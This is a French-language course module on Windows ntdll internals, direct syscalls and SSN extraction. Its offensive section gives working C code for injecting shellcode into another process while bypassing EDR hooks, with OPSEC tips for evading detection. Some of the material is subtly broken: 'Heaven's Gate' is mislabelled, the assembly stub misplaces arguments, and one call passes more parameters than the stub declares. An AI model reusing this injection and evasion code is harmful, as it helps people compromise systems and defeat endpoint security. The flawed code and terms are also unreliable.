# NTDLL Internals (Native API et Syscalls)

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- Comprendre le rôle de ntdll.dll comme passerelle vers le kernel
- Différencier Win32 API, Native API et syscalls
- Analyser les stubs syscall dans ntdll.dll
- Extraire les System Service Numbers (SSN) dynamiquement
- Implémenter des syscalls directs pour bypasser les hooks EDR
- Utiliser Hell's Gate et Heaven's Gate pour résolution SSN

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C et assembleur x86/x64
- Le format PE et parsing (W11, W12)
- Le PEB/TEB (W14)
- Les concepts de User Mode vs Kernel Mode

## Introduction

**ntdll.dll** est la DLL la plus importante de Windows en mode utilisateur. Elle contient les **Native APIs** (Nt*/Zw* functions) qui sont les seules fonctions pouvant transition vers le kernel via les **syscalls**. Tous les appels système Windows passent par ntdll.dll.

### Pourquoi ce sujet est important ?

```ascii
HIÉRARCHIE DES APIs WINDOWS :

┌──────────────────────────────────────────────────┐
│ APPLICATION                                       │
├──────────────────────────────────────────────────┤
│ Win32 API (kernel32.dll, user32.dll...)          │
│ ├─ CreateFileA()                                 │
│ ├─ ReadFile()                                    │
│ └─ VirtualAlloc()                                │
├──────────────────────────────────────────────────┤  ← EDR hooks ICI
│ NTDLL.DLL (Native API)                           │
│ ├─ NtCreateFile()           ← Stub syscall       │
│ ├─ NtReadFile()             ← Stub syscall       │
│ └─ NtAllocateVirtualMemory() ← Stub syscall      │
├──────────────────────────────────────────────────┤
│ SYSCALL INSTRUCTION                               │
│ mov r10, rcx                                     │
│ mov eax, SSN                                     │
│ syscall                                          │
├──────────────────────────────────────────────────┤
│ KERNEL (ntoskrnl.exe)                            │
│ ├─ NtCreateFile (kernel implementation)          │
│ └─ System Service Dispatch Table (SSDT)          │
└──────────────────────────────────────────────────┘

POURQUOI BYPASS NTDLL ?
┌────────────────────────────────────────────────┐
│ EDR/AV hookent ntdll.dll pour surveiller :     │
│ ├─ Allocations mémoire suspectes              │
│ ├─ Injection de code                          │
│ ├─ Accès fichiers sensibles                   │
│ └─ Manipulation de processus/threads           │
├────────────────────────────────────────────────┤
│ SOLUTION: SYSCALLS DIRECTS                     │
│ ├─ Appeler directement le kernel              │
│ ├─ Bypasser les hooks ntdll                   │
│ ├─ Nécessite connaître les SSN                │
│ └─ Technique avancée Red Team                  │
└────────────────────────────────────────────────┘

Analogie : ntdll.dll = douane entre userland et kernel
           Syscalls directs = passer la douane sans contrôle
```

## Concepts fondamentaux

### Concept 1 : Structure d'un stub syscall

Chaque fonction Native API est un simple **stub** qui prépare et exécute le syscall.

```ascii
ANATOMIE D'UN STUB SYSCALL (x64) :

ntdll!NtAllocateVirtualMemory:
┌───────────────────────────────────────┐
│ 4C 8B D1             mov r10, rcx    │  ← Sauvegarde RCX (1er param)
│ B8 18 00 00 00       mov eax, 0x18   │  ← SSN (System Service Number)
│ 0F 05                syscall          │  ← Transition vers kernel
│ C3                   ret              │  ← Retour
└───────────────────────────────────────┘

VARIATIONS SELON VERSION WINDOWS :
Windows 10 1809 : SSN = 0x18
Windows 10 20H2 : SSN = 0x18
Windows 11 21H2 : SSN = 0x1A  ← CHANGEMENT !

Les SSN changent entre versions → Besoin résolution dynamique
```

**Pattern de stub x64** :

```c
// Pattern générique d'un stub syscall x64
// Offset 0x00 : 4C 8B D1          mov r10, rcx
// Offset 0x03 : B8 XX 00 00 00    mov eax, SSN  ← SSN ici !
// Offset 0x08 : 0F 05             syscall
// Offset 0x0A : C3                ret
```

**Pattern de stub x86** :

```ascii
ntdll!NtAllocateVirtualMemory (x86):
┌───────────────────────────────────────┐
│ B8 XX 00 00 00       mov eax, SSN    │  ← SSN
│ BA 00 03 FE 7F       mov edx, 0x7FFE0300
│ FF 12                call [edx]      │  ← Int 2E ou sysenter
│ C2 18 00             ret 0x18        │
└───────────────────────────────────────┘
```

### Concept 2 : System Service Numbers (SSN)

Le **SSN** identifie la fonction kernel dans la **System Service Dispatch Table (SSDT)**.

```ascii
SSDT (KERNEL) :

Index   Fonction Kernel
───────────────────────────────────
0x00    NtAccessCheck
0x01    NtWorkerFactoryWorkerReady
0x02    NtAcceptConnectPort
...
0x18    NtAllocateVirtualMemory  ← SSN = 0x18
0x19    NtAllocateVirtualMemoryEx
...
0x55    NtCreateFile
...

PROBLÈME : SSN changent selon :
- Version Windows (10, 11)
- Build number (1809, 20H2, 21H2...)
- Architecture (x86, x64)

SOLUTION : Extraction dynamique depuis ntdll.dll
```

### Concept 3 : Hell's Gate - Extraction SSN

Technique pour extraire le SSN depuis le stub ntdll.dll en mémoire.

```c
// Extraire SSN depuis un stub ntdll
DWORD get_ssn_hell_gate(PVOID pFunctionAddress) {
    // Pattern attendu : 4C 8B D1 B8 [SSN] 00 00 00
    BYTE* pStub = (BYTE*)pFunctionAddress;

    // Vérifier pattern
    if (pStub[0] == 0x4C && pStub[1] == 0x8B && pStub[2] == 0xD1 &&
        pStub[3] == 0xB8) {
        // SSN à offset +4 (little endian)
        DWORD ssn = *(DWORD*)(pStub + 4);
        return ssn;
    }

    return -1; // Pattern non trouvé
}
```

```ascii
VISUALISATION :

Adresse de NtAllocateVirtualMemory dans ntdll.dll
          ↓
┌─────────┬─────────┬─────────┬─────────┬─────────┬─────────┐
│ 4C 8B D1│ B8      │ 18 00   │ 00 00   │ 0F 05   │ C3      │
└─────────┴─────────┴─────────┴─────────┴─────────┴─────────┘
  mov r10,  mov eax,  SSN=0x18  syscall   ret
  rcx

Lecture du SSN : *(DWORD*)(pStub + 4) = 0x00000018
```

### Concept 4 : Heaven's Gate - Contourner les hooks

Si ntdll.dll est hookée (EDR), le pattern n'est plus `4C 8B D1 B8 ...` mais un JMP vers le hook.

```ascii
STUB HOOKÉE :

Avant hook (original) :
┌───────────────────────────────────┐
│ 4C 8B D1 B8 18 00 00 00 0F 05 C3  │  ← Pattern normal
└───────────────────────────────────┘

Après hook EDR :
┌───────────────────────────────────┐
│ E9 XX XX XX XX                    │  ← JMP vers hook EDR
│ (code original écrasé)            │
└───────────────────────────────────┘

SOLUTION : HEAVEN'S GATE
→ Lire ntdll.dll propre depuis disque
→ Comparer avec ntdll en mémoire
→ Détecter et contourner hooks
```

**Implémentation Heaven's Gate** :

```c
DWORD get_ssn_heaven_gate(const char* functionName) {
    // 1. Récupérer ntdll.dll en mémoire (potentiellement hookée)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    // 2. Mapper ntdll.dll propre depuis disque
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                               GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    // 3. Trouver fonction dans ntdll propre
    FARPROC pCleanFunc = find_export_in_memory(pCleanNtdll, functionName);

    // 4. Extraire SSN depuis ntdll propre (non hookée)
    DWORD ssn = get_ssn_hell_gate(pCleanFunc);

    // Cleanup
    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return ssn;
}
```

## Mise en pratique

### Étape 1 : Parser Export Table de ntdll

```c
#include <windows.h>
#include <stdio.h>

// Trouver adresse d'export dans un module mappé
FARPROC find_export_in_memory(LPVOID pModuleBase, const char* exportName) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDos->e_lfanew);

    DWORD exportRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pModuleBase + exportRVA);

    DWORD* pFunctions = (DWORD*)((BYTE*)pModuleBase + pExport->AddressOfFunctions);
    DWORD* pNames = (DWORD*)((BYTE*)pModuleBase + pExport->AddressOfNames);
    WORD* pOrdinals = (WORD*)((BYTE*)pModuleBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)pModuleBase + pNames[i]);
        if (strcmp(name, exportName) == 0) {
            WORD ordinal = pOrdinals[i];
            DWORD funcRVA = pFunctions[ordinal];
            return (FARPROC)((BYTE*)pModuleBase + funcRVA);
        }
    }

    return NULL;
}
```

### Étape 2 : Extraire SSN (Hell's Gate)

```c
// Extraire SSN depuis ntdll en mémoire
DWORD extract_ssn(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return -1;

    // Trouver fonction
    FARPROC pFunc = GetProcAddress(hNtdll, functionName);
    if (!pFunc) return -1;

    BYTE* pStub = (BYTE*)pFunc;

    // Vérifier pattern syscall x64
    // 4C 8B D1 B8 [SSN 4 bytes] 00 00 00
    if (pStub[0] == 0x4C && pStub[1] == 0x8B && pStub[2] == 0xD1 &&
        pStub[3] == 0xB8) {

        DWORD ssn = *(DWORD*)(pStub + 4);
        return ssn;
    }

    // Si hookée, pattern différent
    printf("[!] Fonction potentiellement hookée : %s\n", functionName);
    return -1;
}

void test_extract_ssns() {
    printf("=== EXTRACTION SSN ===\n");

    const char* functions[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtOpenProcess",
        "NtClose",
        NULL
    };

    for (int i = 0; functions[i] != NULL; i++) {
        DWORD ssn = extract_ssn(functions[i]);
        if (ssn != -1) {
            printf("%-30s SSN = 0x%04X\n", functions[i], ssn);
        } else {
            printf("%-30s FAILED\n", functions[i]);
        }
    }
}
```

### Étape 3 : Exécuter un syscall direct (ASM)

```c
// Définir prototype syscall
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Stub assembleur pour syscall direct
extern NTSTATUS SyscallStub(
    DWORD ssn,
    PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4,
    PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8
);

// Assembleur x64 (syscall_stub.asm)
/*
.code

SyscallStub proc
    mov r10, rcx          ; 1er param = SSN
    mov eax, r10d         ; Charger SSN dans EAX

    ; Arguments déjà dans les bons registres (x64 calling convention)
    ; RDX = arg1, R8 = arg2, R9 = arg3, stack = arg4+

    syscall               ; Exécuter syscall
    ret
SyscallStub endp

end
*/

// Utilisation
void test_direct_syscall() {
    // 1. Extraire SSN
    DWORD ssn = extract_ssn("NtAllocateVirtualMemory");
    printf("[+] SSN NtAllocateVirtualMemory = 0x%04X\n", ssn);

    // 2. Préparer paramètres
    HANDLE hProcess = (HANDLE)-1; // Current process
    PVOID baseAddr = NULL;
    SIZE_T regionSize = 0x1000;
    ULONG allocType = MEM_COMMIT | MEM_RESERVE;
    ULONG protect = PAGE_READWRITE;

    // 3. Appeler via syscall direct
    NTSTATUS status = SyscallStub(
        ssn,
        hProcess,
        &baseAddr,
        0,
        &regionSize,
        allocType,
        protect,
        NULL,
        NULL
    );

    if (status == 0) {
        printf("[+] Mémoire allouée à : 0x%p\n", baseAddr);
    } else {
        printf("[-] Échec : NTSTATUS = 0x%08X\n", status);
    }
}
```

### Étape 4 : Détecter et contourner hooks

```c
// Détecter si une fonction est hookée
BOOL is_function_hooked(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFunc = GetProcAddress(hNtdll, functionName);

    if (!pFunc) return FALSE;

    BYTE* pStub = (BYTE*)pFunc;

    // Pattern normal : 4C 8B D1 B8 ...
    if (pStub[0] == 0x4C && pStub[1] == 0x8B && pStub[2] == 0xD1) {
        return FALSE; // Pas hookée
    }

    // Si commence par JMP (E9) ou PUSH/RET → hookée
    if (pStub[0] == 0xE9 || pStub[0] == 0xFF || pStub[0] == 0x68) {
        return TRUE; // Hookée !
    }

    return FALSE; // Incertain
}

void scan_ntdll_hooks() {
    printf("\n=== SCAN HOOKS NTDLL ===\n");

    const char* critical_functions[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtResumeThread",
        "NtGetContextThread",
        "NtSetContextThread",
        NULL
    };

    int hooked_count = 0;

    for (int i = 0; critical_functions[i] != NULL; i++) {
        BOOL hooked = is_function_hooked(critical_functions[i]);
        printf("%-30s : %s\n",
               critical_functions[i],
               hooked ? "[HOOKED]" : "[CLEAN]");

        if (hooked) hooked_count++;
    }

    printf("\n%d/%d fonctions hookées\n", hooked_count, i - 1);

    if (hooked_count > 0) {
        printf("[!] EDR/AV détecté !\n");
    }
}
```

## Application offensive

### Contexte Red Team

#### 1. Bypasser EDR avec syscalls directs

```c
// Allouer mémoire en évitant hooks VirtualAllocEx
PVOID allocate_memory_syscall(HANDLE hProcess, SIZE_T size) {
    // 1. Résoudre SSN dynamiquement
    DWORD ssn = extract_ssn("NtAllocateVirtualMemory");

    // 2. Appeler syscall direct
    PVOID baseAddr = NULL;
    SIZE_T regionSize = size;

    NTSTATUS status = SyscallStub(
        ssn,
        hProcess,
        &baseAddr,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
        NULL,
        NULL
    );

    return (status == 0) ? baseAddr : NULL;
}

// Écrire mémoire processus distant
BOOL write_memory_syscall(HANDLE hProcess, PVOID address, PVOID buffer, SIZE_T size) {
    DWORD ssn = extract_ssn("NtWriteVirtualMemory");

    SIZE_T bytesWritten = 0;

    NTSTATUS status = SyscallStub(
        ssn,
        hProcess,
        address,
        buffer,
        size,
        &bytesWritten,
        NULL,
        NULL,
        NULL
    );

    return (status == 0 && bytesWritten == size);
}
```

#### 2. Process Injection avec syscalls

```c
BOOL inject_shellcode_syscall(DWORD pid, PVOID shellcode, SIZE_T shellcodeSize) {
    // 1. Ouvrir processus cible
    DWORD ssnOpen = extract_ssn("NtOpenProcess");
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr = {0};
    CLIENT_ID clientId = {(HANDLE)pid, NULL};

    NTSTATUS status = SyscallStub(ssnOpen, &hProcess, PROCESS_ALL_ACCESS,
                                  &objAttr, &clientId, NULL, NULL, NULL, NULL);

    if (status != 0) {
        printf("[-] NtOpenProcess failed: 0x%08X\n", status);
        return FALSE;
    }

    // 2. Allouer mémoire
    PVOID remoteBuffer = allocate_memory_syscall(hProcess, shellcodeSize);
    if (!remoteBuffer) {
        printf("[-] Allocation failed\n");
        return FALSE;
    }

    printf("[+] Allocated at: 0x%p\n", remoteBuffer);

    // 3. Écrire shellcode
    if (!write_memory_syscall(hProcess, remoteBuffer, shellcode, shellcodeSize)) {
        printf("[-] Write failed\n");
        return FALSE;
    }

    printf("[+] Shellcode written\n");

    // 4. Changer protections RX
    DWORD ssnProtect = extract_ssn("NtProtectVirtualMemory");
    SIZE_T regionSize = shellcodeSize;
    ULONG oldProtect;

    status = SyscallStub(ssnProtect, hProcess, &remoteBuffer, &regionSize,
                        PAGE_EXECUTE_READ, &oldProtect, NULL, NULL, NULL);

    // 5. Créer thread
    DWORD ssnThread = extract_ssn("NtCreateThreadEx");
    HANDLE hThread = NULL;

    status = SyscallStub(ssnThread, &hThread, THREAD_ALL_ACCESS, NULL,
                        hProcess, remoteBuffer, NULL, 0, 0, 0, 0);

    if (status == 0) {
        printf("[+] Thread created: 0x%p\n", hThread);
        return TRUE;
    }

    return FALSE;
}
```

### Considérations OPSEC

```ascii
DÉTECTIONS & MITIGATIONS

┌────────────────────────────────────────────────┐
│ INDICATEURS SYSCALLS DIRECTS                   │
├────────────────────────────────────────────────┤
│ ✗ Return address anormale                     │
│   → Syscall depuis .text au lieu de ntdll     │
│                                                │
│ ✗ Call stack anormal                          │
│   → Manque frames ntdll.dll                   │
│                                                │
│ ✗ Régions RWX                                 │
│   → Stub assembleur en mémoire exécutable     │
└────────────────────────────────────────────────┘

┌────────────────────────────────────────────────┐
│ BONNES PRATIQUES                               │
├────────────────────────────────────────────────┤
│ ✓ Spoof call stack (ROP chains)               │
│ ✓ Utiliser Heaven's Gate pour SSN fiables     │
│ ✓ Combiner avec unhooking ntdll               │
│ ✓ Varier les techniques (pas toujours syscall)│
│ ✓ Sleep obfuscation entre opérations          │
└────────────────────────────────────────────────┘

ALTERNATIVES :
- Unhooking ntdll.dll (restaurer depuis disque)
- Module stomping (utiliser ntdll légitime)
- Indirect syscalls (call via ntdll légitime)
```

## Résumé

- **ntdll.dll** = passerelle unique entre user mode et kernel mode
- **Native API** (Nt*/Zw*) = stubs qui exécutent syscalls
- **SSN (System Service Number)** = index dans SSDT kernel, change entre versions Windows
- **Hell's Gate** = extraction SSN depuis stub ntdll en mémoire
- **Heaven's Gate** = extraction SSN depuis ntdll propre (disque) pour éviter hooks
- **Syscalls directs** = bypass hooks EDR en appelant directement kernel
- **OPSEC** : Call stack anormal détectable, combiner avec autres techniques
- Essentiel pour Red Team avancé et évasion EDR

## Ressources complémentaires

- [SysWhispers - Syscall generator](https://github.com/jthuraisamy/SysWhispers)
- [Hell's Gate paper](https://github.com/am0nsec/HellsGate)
- [Halo's Gate - Hook evasion](https://blog.sektor7.net/#!res/2021/halosgate.md)
- [Direct Syscalls - ired.team](https://www.ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs)
- [Windows Syscall Table](https://j00ru.vexillium.org/syscalls/nt/64/)
- [Vergilius Project - SSDT](https://www.vergiliusproject.com/)

---

**Navigation**
- [Module précédent](../05-System-Calls-NTAPI/)
- [Module suivant](../07-Object-Manager/)
